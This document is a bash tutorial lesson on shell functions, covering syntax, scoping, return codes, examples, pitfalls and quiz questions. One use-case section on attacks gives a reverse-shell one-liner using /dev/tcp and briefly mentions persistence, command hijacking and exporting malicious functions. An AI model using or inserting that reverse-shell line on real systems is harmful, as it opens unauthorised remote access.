# Lesson 14: Functions

## History & Origins

Functions in shell scripting were introduced in the Bourne shell (Unix V7, 1979). Stephen Bourne modeled them after the `goto`-with-subroutine patterns common in earlier shells, but gave them a cleaner syntax inspired by ALGOL and Pascal. The original Bourne shell syntax used `name () { ... }` — no `function` keyword.

The `function` keyword was introduced by the Korn shell (ksh, 1983) as an alternative style. Bash, being a GPL-licensed reimplementation combining features of Bourne, Korn, and C shells, supports both styles. The `function` keyword is purely decorative — there's no behavioral difference.

Local variables via the `local` keyword were a ksh innovation (1983) that bash adopted. Before `local`, all shell variables were global — a function calling another function could accidentally overwrite variables. This was a major source of bugs in early shell scripts.

The `return` builtin has always been part of functions. Return codes (0-255) follow Unix process exit code conventions. Unlike `exit`, which terminates the entire shell, `return` exits only the function and returns control to the caller.

Fun fact: The original Bourne shell man page called functions "shell procedures" not "functions" — they don't return values like C functions. They're more like subroutines that can set variables and produce output. The "return value" is really an exit code.

## Syntax Reference

### Function definition styles
```bash
# Style 1: POSIX/Bourne (no function keyword)
func_name() {
    commands
    return N
}

# Style 2: Korn/bash (with function keyword)
function func_name {
    commands
    return N
}

# Style 3: Mixed (works in bash)
function func_name() {
    commands
}
```

### Parameters
```bash
func_name arg1 arg2 arg3      # Call with arguments

# Inside the function:
$0          # Script name (NOT function name!)
$1, $2, ... # Positional parameters
$@          # All arguments as separate words
$*          # All arguments as one string
$#          # Number of arguments
${@:2}      # Arguments from position 2 onwards
${@: -1}    # Last argument
"${@:2:3}"  # 3 arguments starting at position 2
```

### Variables
```bash
local var=value              # Scoped to function (bash/ksh)
local -i var=value           # Integer attribute
local -r var=value           # Readonly local
local -a arr=(items)         # Local array
local -A arr=([k]=v)         # Local associative array
declare -g var=value         # Explicitly global (bash 4.2+)

typeset var=value            # Same as local (ksh style)
```

### Return values
```bash
return N        # Return exit code N (0-255)
return          # Return exit code of last command

# Functions don't "return" strings — they echo them:
get_name() {
    echo "Alice"
}
name=$(get_name)  # Capture echoed output
```

### Special variables for introspection
```bash
$FUNCNAME          # Function name (array in bash)
${FUNCNAME[0]}     # Current function name
${FUNCNAME[1]}     # Calling function
$BASH_LINENO       # Line numbers in call stack
$BASH_SOURCE       # Source files in call stack
```

### Exporting functions
```bash
export -f func_name    # Export to child shells
declare -fx func_name  # Export (same thing)
```

## Under the Hood

### How Bash Processes Functions

1. **Definition**: When bash reads `func() { ... }`, it stores the function body as a string in an internal hash table, keyed by the function name.
2. **No execution**: The function body is NOT executed at definition time. Only parsed for syntax.
3. **Calling**: When `func` is invoked, bash looks up the name in the function hash table first (before checking PATH).
4. **Argument setup**: Current positional parameters (`$1`, `$2`, etc.) are saved. New `$@` is set from the function's arguments.
5. **Variable scoping**: `local` variables are pushed onto a variable stack. Global variables of the same name are shadowed.
6. **Execution**: The function body is executed line by line.
7. **Cleanup**: `local` variables are popped from the stack. Previous positional parameters are restored.
8. **Return**: `return` sets the exit code. If no `return`, the exit code is the last command's.

### Function Call Stack

```
main script (PID 1234)
  |-- $FUNCNAME is empty (main scope)
  |-- $1 = "arg1" (script argument)
  |
  +-- calls validate() "$file"
      |-- $FUNCNAME[0] = "validate"
      |-- $1 = "/etc/passwd" (function argument)
      |-- local result
      |
      +-- calls check_readable() "$1"
          |-- $FUNCNAME[0] = "check_readable"
          |-- $FUNCNAME[1] = "validate"
          |-- $1 = "/etc/passwd"
          |-- return 0
      |
      |-- echo "valid"
      |-- return 0
  |
  |-- $1 = "arg1" (restored)
```

### Memory Model

Functions are stored in the bash process's heap as strings. Each function definition takes memory proportional to its body's source code length. For example:

```bash
bigfunc() {
    # 1000 lines of code
}
```

This stores ~1000 lines in memory. If you define 100 functions of 100 lines each, you use ~10K lines worth of memory — usually negligible.

Exported functions (`export -f`) are encoded as environment variables with names like `BASH_FUNC_funcname%%`. The child bash process parses these and imports them as function definitions. This is how `.bashrc` functions appear in child shells.

### strace View

Function calls don't produce system calls — they're purely in-process. You only see syscalls for commands called INSIDE the function:

```bash
$ strace -e trace=write bash -c 'f() { echo "hello"; }; f'
write(1, "hello\n", 6)                 = 6
```

## Core Examples (12)

### Example 1: Simple Function
```bash
$ greet() {
    echo "Hello, $1!"
}
$ greet "World"
Hello, World!
$ greet "Alice"
Hello, Alice!
```
The function takes one argument (`$1`). Calls it with different arguments produce different output.

### Example 2: Function with Return Code
```bash
$ is_even() {
    if [ $(($1 % 2)) -eq 0 ]; then
        return 0
    else
        return 1
    fi
}
$ is_even 4 && echo "Even" || echo "Odd"
Even
$ is_even 7 && echo "Even" || echo "Odd"
Odd
```
`return 0` = success/true. `return 1` = failure/false. Used with `&&`/`||` for conditional execution.

**What if:** You return a number > 255? Exit codes are modulo 256. `return 256` = `return 0`, `return 257` = `return 1`.

### Example 3: Local Variables
```bash
$ count() {
    local i=0
    for val in "$@"; do
        ((i++))
    done
    echo "Count: $i"
}
$ count a b c d e
Count: 5
$ echo "${i:-unset}"
unset
```
`local i=0` creates a variable scoped to the function. After the function ends, `i` is gone. Without `local`, `i` would leak into the global scope.

### Example 4: Function Library Pattern
```bash
$ cat > ~/lib.sh << 'EOF'
die() {
    echo "ERROR: $1" >&2
    exit "${2:-1}"
}

usage() {
    echo "Usage: $0 [options] <file>" >&2
    exit 2
}

is_root() {
    [ "$(id -u)" -eq 0 ]
}

confirm() {
    read -r -p "$1 [y/N] " response
    case "$response" in
        [yY]|[yY][eE][sS]) return 0 ;;
        *) return 1 ;;
    esac
}

backup_file() {
    local file="$1"
    local backup="$file.bak.$(date +%Y%m%d-%H%M%S)"
    if [ ! -e "$backup" ]; then
        cp "$file" "$backup"
        echo "Backed up: $backup"
    else
        echo "Backup exists: $backup"
    fi
}
EOF
$ source ~/lib.sh
$ is_root && echo "root" || echo "not root"
not root
```
This is the reusable library pattern: define functions in a separate file, source it in scripts that need them. Functions hide complexity behind readable names.

### Example 5: shift Through Arguments
```bash
$ print_args() {
    while [ $# -gt 0 ]; do
        echo "Arg: $1"
        shift
    done
}
$ print_args one two three
Arg: one
Arg: two
Arg: three
```
`shift` removes `$1` and shifts all others down. `$#` decreases by 1 each iteration. This is how option parsers work.

### Example 6: Functions Calling Functions
```bash
$ say_hello() {
    echo "Hello, $1!"
}
$ greet_user() {
    local name="$1"
    say_hello "$name"
    echo "Welcome to the script."
}
$ greet_user "Alice"
Hello, Alice!
Welcome to the script.
```
Functions can call other functions. The call stack grows. Each function has its own `$1`, `$2`, etc.

### Example 7: Capture Function Output
```bash
$ get_date() {
    date +%Y-%m-%d
}
$ get_username() {
    whoami
}
$ today=$(get_date)
$ user=$(get_username)
$ echo "Report for $user on $today"
Report for phd on 2026-07-31
```
Functions "return" strings by echoing them. The caller captures with command substitution `$()`.

**What if:** The function writes to stderr? That's NOT captured: `echo "debug" >&2` goes to terminal, not the variable.

### Example 8: Default Values for Arguments
```bash
$ greet() {
    local name="${1:-World}"
    local greeting="${2:-Hello}"
    echo "$greeting, $name!"
}
$ greet
Hello, World!
$ greet "Alice"
Hello, Alice!
$ greet "Bob" "Hi"
Hi, Bob!
```
`${1:-default}` provides a default if `$1` is unset or empty. Useful for optional arguments.

### Example 9: Multiple Return Values via Variable
```bash
$ split_name() {
    local full="$1"
    local first="${full%% *}"
    local last="${full#* }"
    echo "$first"   # Can only echo ONE "return"?
    # Actually, we can set global variables:
    FIRST_NAME="$first"
    LAST_NAME="$last"
}
$ split_name "John Doe"
$ echo "First: $FIRST_NAME, Last: $LAST_NAME"
First: John, Last: Doe
```
Or better, use nameref (bash 4.3+):
```bash
$ split_name() {
    local -n first_ref="$1"
    local -n last_ref="$2"
    local full="$3"
    first_ref="${full%% *}"
    last_ref="${full#* }"
}
$ split_name first last "Jane Smith"
$ echo "First: $first, Last: $last"
First: Jane, Last: Smith
```

### Example 10: Recursive Function
```bash
$ factorial() {
    local n="$1"
    if [ "$n" -le 1 ]; then
        echo 1
    else
        local prev=$(factorial $((n - 1)))
        echo $((n * prev))
    fi
}
$ factorial 5
120
```
Bash functions can be recursive. Each call gets its own `local` variables. Depth is limited by stack size (usually ~1000 calls before crash).

### Example 11: Function in a Script vs Interactive Shell
```bash
$ cat > ~/demo.sh << 'EOF'
#!/bin/bash
my_func() {
    local var="I am local"
    echo "$var"
    echo "Function name: ${FUNCNAME[0]}"
    echo "Script name: $0"
}
my_func
echo "Global var: ${var:-unset}"
EOF
$ chmod +x ~/demo.sh
$ ./demo.sh
I am local
Function name: my_func
Script name: ./demo.sh
Global var: unset
```
`$0` inside a function is still the script name, not the function name. Use `${FUNCNAME[0]}` for the function name.

### Example 12: Function That Modifies a Global Array
```bash
$ add_entry() {
    # Without local: modifies global
    ENTRIES+=("$1")
}
$ ENTRIES=()
$ add_entry "first"
$ add_entry "second"
$ echo "${ENTRIES[@]}"
first second
```
Functions can modify global arrays without `local` or `declare`. This is both powerful (returning complex data) and dangerous (side effects).

## Real-World Use Cases

### 1. FOR the OS — Administration, Automation, System Maintenance
- **Library of system checks**: `check_disk()`, `check_mem()`, `check_process()` in `/etc/profile.d/`
- **Service management**: `restart_service() { systemctl restart "$1"; }`
- **Log helpers**: `log_info()`, `log_error()`, `log_warn()` with timestamps
- **Backup routines**: `full_backup()`, `incremental_backup()`, `verify_backup()`
- **Notification**: `alert_admin() { mail -s "ALERT" admin@example.com <<< "$1"; }`

### 2. WITH the OS — Development, Data Processing, Daily Workflow
- **Git helpers**: `gco() { git checkout "$@"; }`, `gst() { git status; }`, `glog() { git log --oneline; }`
- **Build functions**: `compile() { gcc -Wall -o "$1" "$1.c"; }`
- **File ops**: `extract() { tar -xzf "$1"; }`, `compress() { tar -czf "${1%/}.tar.gz" "$1"; }`
- **Validators**: `is_valid_ip() { [[ "$1" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; }`
- **Path manipulation**: `abs_path() { echo "$(cd "$(dirname "$1")" && pwd)/$(basename "$1")"; }`

### 3. AGAINST the OS — Exploitation, Bypasses, Attacks
- **Reverse shell function**: `revshell() { bash -i >& /dev/tcp/"$1"/"$2" 0>&1; }`
- **Privilege check**: `can_root() { [ "$(id -u)" -eq 0 ]; }`
- **Persistence**: Adding functions to `.bashrc` that phone home on login
- **Function hijacking**: Redefining `ls` as a function that hides malicious files
- **Environment pollution**: `export -f` malicious functions into child scripts

### 4. FOR DEFENSE — Detection, Prevention, Auditing
- **Checking function definitions**: `declare -f suspicious_func` to inspect
- **Auditing .bashrc**: Scan for unexpected function definitions
- **Safe wrappers**: `sudo() { if [ "$1" = "rm" ]; then echo "Blocked"; else command sudo "$@"; fi; }`
- **Logging wrappers**: `cd() { echo "cd to $1 at $(date)" >> ~/.cd_log; builtin cd "$1"; }`
- **Shellshock detection**: Checking for exported functions with `BASH_FUNC_` prefix

## Memory Aids

- **`func() { }`**: The parentheses look like a mouth about to say something. The braces are where the words come out.
- **`local`**: Think "LOCAL area" — the variable only exists in this neighborhood, not in the big city (global scope).
- **`return` vs `exit`**: "Return to caller" vs "Exit the building entirely."
- **`$FUNCNAME`**: It's an array because the shell tracks the FUNCTION call stack NAME.
- **`$1`, `$2`, `$@`**: Think of them as labeled slots. When you call `func a b c`, a goes in slot 1, b in slot 2, c in slot 3.
- **`shift`**: Like shifting gears — everything moves forward one position. First gear ($1) drops out, second gear ($2) becomes first.
- **"Functions are for your `.bashrc`"**: If you find yourself aliasing something with arguments, it's time for a function.

## Trap Vault (12 traps)

### Trap 1: return vs exit in Functions
**Problem:** Using `exit` inside a function terminates the whole script.
**Example:**
```bash
$ test_func() {
    [ -f "$1" ] || exit 1
    echo "OK"
}
$ test_func /nonexistent
# Script terminates immediately!
```
**Why:** `exit` exits the entire shell, not just the function.
**Fix:** Use `return` in functions: `[ -f "$1" ] || return 1`.

### Trap 2: Forgetting `local`
**Problem:** Variables leak from function to global scope.
**Example:**
```bash
$ set_name() {
    name="$1"  # No local!
}
$ name="global"
$ set_name "Alice"
$ echo "$name"
Alice  # Overwritten!
```
**Fix:** `local name="$1"` — always scope variables inside functions.

### Trap 3: $0 Inside a Function
**Problem:** `$0` is the script name, not the function name.
**Example:**
```bash
$ myfunc() {
    echo "Function: $0"
}
$ myfunc
Function: /bin/bash   # Not "myfunc"!
```
**Fix:** Use `$FUNCNAME` or `${FUNCNAME[0]}` for the function name.

### Trap 4: Function Must Be Defined Before Call
**Problem:** Calling a function before defining it fails.
**Example:**
```bash
$ call_early
call_early: command not found
$ call_early() { echo "defined after call"; }
```
**Why:** Bash reads top-to-bottom. Functions are stored when the definition is parsed.
**Fix:** Define functions at the top of your script, or source a library before calling.

### Trap 5: return Outside a Function
**Problem:** Using `return` at script top level causes error.
**Example:**
```bash
$ cat > script.sh << 'EOF'
echo "Hello"
return 42  # Only OK if sourced!
EOF
$ bash script.sh
line 2: return: can only `return' from a function or sourced script
$ source script.sh
Hello
$ echo $?
42
```
**Why:** `return` is only valid inside a function OR a sourced script. In a standalone script, use `exit`.

### Trap 6: Exported Functions Not in POSIX sh
**Problem:** `export -f` works in bash, not in dash/sh.
**Example:**
```bash
$ myfunc() { echo "Hello"; }
$ export -f myfunc
$ dash -c 'myfunc'
dash: 1: myfunc: not found
```
**Why:** `export -f` is a bash extension. Other shells don't support function export.
**Fix:** Only use exported functions in bash scripts with `#!/bin/bash`.

### Trap 7: Function Overriding Commands
**Problem:** A function with the same name as a command shadows it.
**Example:**
```bash
$ ls() {
    command ls --color=auto "$@"
}
$ ls /tmp  # Uses ls function, not /bin/ls
```
**Why:** Functions are checked before PATH in command lookup.
**Fix:** Use `command ls` inside the function to call the real command, preventing infinite recursion.

### Trap 8: Recursion Depth Limit
**Problem:** Deep recursion causes "segmentation fault" or "stack overflow."
**Example:**
```bash
$ recurse() { recurse; }
$ recurse
Segmentation fault (core dumped)
```
**Why:** Each call uses stack space. Default ulimit is ~8MB stack. Bash recursion hits this at ~1000-10000 calls.
**Fix:** Avoid deep recursion. Use iterative loops instead.

### Trap 9: Variable Shadowing With `local`
**Problem:** `local` shadows global variables, which can surprise.
**Example:**
```bash
$ DEBUG=1
$ log() {
    local DEBUG=0  # Shadows global DEBUG inside function
    [ "$DEBUG" -eq 1 ] && echo "Debug: $1"
}
$ log "test"    # No output — local DEBUG=0
```
**Fix:** Be explicit: `local DEBUG="${DEBUG:-0}"` if you want to inherit default.

### Trap 10: return Code Range
**Problem:** Returning 256 or -1 wraps around.
**Example:**
```bash
$ test_func() {
    return 256
}
$ test_func
$ echo $?
0  # 256 % 256 = 0!
```
**Fix:** Only use return codes 0-255. Use global variables or echo for larger values.

### Trap 11: Function Name Conflicts With Aliases
**Problem:** An alias prevents a function from being defined.
**Example:**
```bash
$ alias myfunc='echo "alias"'
$ myfunc() { echo "function"; }
$ myfunc
alias  # Alias wins!
```
**Why:** Aliases are expanded during parsing. `myfunc()` becomes `echo "alias"()` which is garbage.
**Fix:** `unalias myfunc` first, or use `\myfunc` to bypass alias.

### Trap 12: `local` Can't Be Used Outside Function
**Problem:** Using `local` in script top level is a syntax error.
**Example:**
```bash
$ cat > script.sh << 'EOF'
local var="test"  # ERROR
echo "$var"
EOF
$ bash script.sh
script.sh: line 1: local: can only be used in a function
```
**Fix:** Use `var="test"` (global) or wrap in a function.

## See It In The Wild

### System functions
Some systems have function definitions in `/etc/profile.d/`:
```bash
$ grep -r "^[a-zA-Z_].*()" /etc/profile.d/ 2>/dev/null | head -10
$ declare -F  # List all currently defined functions
```

### Try this now:
```bash
# 1. List all functions available in your shell
$ declare -F | head -20
$ declare -f   # Shows full definitions

# 2. Create a function to explore $FUNCNAME
$ stack_trace() {
    local level=0
    while [ "${FUNCNAME[$level]}" ]; do
        echo "${FUNCNAME[$level]} (${BASH_SOURCE[$level]}:${BASH_LINENO[$level]})"
        ((level++))
    done
}
$ outer() { inner; }
$ inner() { stack_trace; }
$ outer

# 3. Export a function and see it in a child
$ hello() { echo "Hello from $$"; }
$ export -f hello
$ bash -c 'hello'
```

## Check Your Understanding (7 questions)

1. What is the difference between `return` and `exit` in a function?

2. Why should you use `local` variables in functions?

3. What does `$#` represent inside a function?

4. What is the maximum value `return` can return?

5. Can you call a function before it's defined in a script? Why or why not?

6. How do you "return" a string from a function?

7. What's the difference between `$0` and `${FUNCNAME[0]}` inside a function?
